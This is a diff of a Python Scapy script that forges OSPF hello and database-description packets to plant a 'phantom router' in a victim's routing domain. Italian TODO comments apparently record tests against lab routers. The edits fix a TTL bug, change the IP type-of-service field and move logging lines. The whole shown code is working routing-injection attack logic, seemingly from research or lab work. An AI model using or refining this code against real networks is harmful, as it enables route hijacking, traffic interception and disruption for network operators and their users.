@@ -36,9 +36,10 @@ eight_bit_space = [1L, 2L, 4L, 8L, 16L, 32L, 64L, 128L]
 def send_hello_packet(iface, srcMAC, dstMAC, srcIP, dstIP, identification_number, ttl):
 	eth_header = Ether(src=srcMAC, dst=dstMAC)
 
-	ip_header = IP(src=srcIP, dst=dstIP, ttl=TTL, proto=89)
+	ip_header = IP(src=srcIP, dst=dstIP, ttl=ttl, proto=89)
 	ip_header.id=identification_number
-	ip_header.ihl = 13L # 0xc0 => DSCP: CS6, ECN: Not-ECT
+	# ip_header.ihl is automatically calculated, as chksum
+	ip_header.tos = 12L
 
 	ospf_header = OSPF_Hdr(\
 		src='2.2.2.3')
@@ -54,19 +55,19 @@ def send_hello_packet(iface, srcMAC, dstMAC, srcIP, dstIP, identification_number
 		# 2L = External Routing
 
 	frame = eth_header/ip_header/ospf_header/ospf_payload
-	frame.show()
 
 	sendp(frame, iface=iface)
+	frame.show()
+	log('sent hello message', 'red')
 
 	identification_number = identification_number + 1
-	print '>>>>>>>>>>>>>>>>>>> %s' % ttl
 
 
 def send_empty_dbd_messages(iface, srcMAC, dstMAC, srcIP, dstIP, identification_number, ttl, n, interval):
 	eth_header = Ether(src=srcMAC, dst=dstMAC)
 
-	ip_header = IP(src=srcIP, dst=dstIP, ttl=TTL, proto=89)
-	ip_header.ihl = 13L # 0xc0 => DSCP: CS6, ECN: Not-ECT
+	ip_header = IP(src=srcIP, dst=dstIP, ttl=ttl, proto=89)
+	ip_header.tos = 12L
 
 	seqNum = randint(0, 2147483648)
 
@@ -93,24 +94,18 @@ def send_empty_dbd_messages(iface, srcMAC, dstMAC, srcIP, dstIP, identification_
 			frame.payload.payload.payload.dbdescr = 1L
 
 		sendp(frame, iface=iface)
+		frame.show()
+		log('sent dbd message %d with seqNum %d' % (i+1, seqNum + i), 'red')
 
 		identification_number = identification_number + 1
-		print '>>>>>>>>>>>>>>>>>>> %s' % ttl
-
-		log('sent dbd message %d with seqNum %d' % (i+1, seqNum + i), 'red')
 
 
 def send_hello_packets(iface, srcMAC, dstMAC, srcIP, dstIP, identification_number, ttl, interval):
-	i = 1
 
 	while True:
 		sleep(interval)
 
 		send_hello_packet(iface, srcMAC, dstMAC, srcIP, dstIP, identification_number, ttl)
-
-		i = i + 1
-
-		log('sent hello message %d' % (i), 'red')
 
 
 def main():
@@ -148,12 +143,8 @@ def main():
 	else:
 		send_hello_packet(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, identification_number, ttl)
 
-	print '>>>>>>>>>>>>>>>>>>> %s' % ttl
-
 	# empty dbd messages to let the victime send over the network its dbd updates
 	send_empty_dbd_messages(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, identification_number, ttl, ATTACK_DBD_MESSAGES, ATTACK_DBD_INTERVAL)
-
-	print '>>>>>>>>>>>>>>>>>>> %s' % ttl
 
 	# hello pakets to persist the presence of the phantom router
 	if remote_flag != 1:
@@ -161,16 +152,14 @@ def main():
 	else:
 		send_hello_packets(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, identification_number, ttl, ATTACK_HELLO_INTERVAL)
 
-	print '>>>>>>>>>>>>>>>>>>> %s' % ttl
-
 	# TODO R3 non fa il forwarding se REMOTE_ATTACK = 1
 	# prova a fare un ping e 
 	# confronta il pacchetto ICMP in andata da ratk a R2
 	# con i pacchetti dell'attacco sempre da ratk a R2
 
-	# TODO compare ping con Hello p.
+	# TODO controlla se il secondo Hello p. va inviato dopo 40 s dal precedente o dopo 40 s dall'ultimo p. inviato
 
-	# TODO confronta cosa cambia avendo impostato ip_header.ihl = 12L
+	# TODO controlla differenze tra ping e Hello p.
 
 if __name__ == "__main__":
 	main()
